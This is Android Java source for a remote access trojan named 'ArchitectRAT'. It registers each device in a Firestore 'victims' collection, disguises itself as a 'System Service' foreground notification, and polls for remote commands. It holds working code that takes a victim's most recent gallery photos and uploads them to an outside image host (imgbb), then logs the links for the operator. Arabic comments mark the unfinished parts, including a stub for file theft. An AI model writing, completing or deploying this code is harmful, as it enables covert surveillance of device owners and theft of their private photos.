package com.architect.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.google.firebase.firestore.*;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class AgentService extends Service {
    private static final String TAG = "ArchitectRAT";
    private static final String CHANNEL_ID = "AgentServiceChannel";
    private FirebaseFirestore db;
    private String deviceId;
    private String imgbbApiKey = "YOUR_IMGBB_API_KEY"; // سيتم استبداله بمتغير بيئة في الإصدار النهائي

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        db = FirebaseFirestore.getInstance();

        Map<String, Object> victim = new HashMap<>();
        victim.put("name", Build.MODEL);
        victim.put("os", "Android " + Build.VERSION.RELEASE);
        victim.put("lastSeen", FieldValue.serverTimestamp());
        db.collection("victims").document(deviceId).set(victim);

        db.collection("victims").document(deviceId).collection("commands")
                .whereEqualTo("status", "pending")
                .addSnapshotListener((snapshots, e) -> {
                    if (e != null || snapshots == null) return;
                    for (DocumentSnapshot doc : snapshots.getDocuments()) {
                        String command = doc.getString("command");
                        executeCommand(command);
                        doc.getReference().update("status", "done");
                    }
                });
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("خدمات النظام")
                .setContentText("جاري التشغيل...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        startForeground(1337, notification);
    }

    private void executeCommand(String cmd) {
        new Thread(() -> {
            try {
                switch (cmd) {
                    case "gallery": uploadPhotos(); break;
                    case "files": uploadFiles(); break;
                    case "vibrate":
                        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                        v.vibrate(500);
                        break;
                    // باقي الأوامر تترك فارغة أو تنفذ لاحقاً
                }
            } catch (Exception e) {
                Log.e(TAG, "Command failed: " + cmd, e);
            }
        }).start();
    }

    private void uploadPhotos() {
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5"
        );
        if (cursor == null) return;
        while (cursor.moveToNext()) {
            String path = cursor.getString(0);
            File imgFile = new File(path);
            if (imgFile.exists()) {
                try {
                    Bitmap bitmap = BitmapFactory.decodeFile(path);
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                    byte[] imageData = baos.toByteArray();
                    String imageUrl = uploadToImgBB(imageData);
                    if (imageUrl != null) {
                        Map<String, Object> result = new HashMap<>();
                        result.put("type", "photo");
                        result.put("url", imageUrl);
                        result.put("timestamp", FieldValue.serverTimestamp());
                        db.collection("victims").document(deviceId).collection("results").add(result);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Upload photo error", e);
                }
            }
        }
        cursor.close();
    }

    private String uploadToImgBB(byte[] imageData) {
        try {
            String apiKey = imgbbApiKey;
            URL url = new URL("https://api.imgbb.com/1/upload?key=" + apiKey);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String base64Image = Base64.encodeToString(imageData, Base64.NO_WRAP);
            String postData = "image=" + URLEncoder.encode(base64Image, "UTF-8");

            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes());
            os.flush();
            os.close();

            if (conn.getResponseCode() == 200) {
                InputStream is = conn.getInputStream();
                String response = readStream(is);
                is.close();
                JSONObject json = new JSONObject(response);
                return json.getJSONObject("data").getString("url");
            }
        } catch (Exception e) {
            Log.e(TAG, "imgBB upload error", e);
        }
        return null;
    }

    private void uploadFiles() {
        // يمكنك استخدام خدمة رفع ملفات مجانية مثل file.io أو أن تتركها فارغة
    }

    private String readStream(InputStream is) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int len;
        while ((len = is.read(buffer)) != -1) baos.write(buffer, 0, len);
        return baos.toString("UTF-8");
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }
}
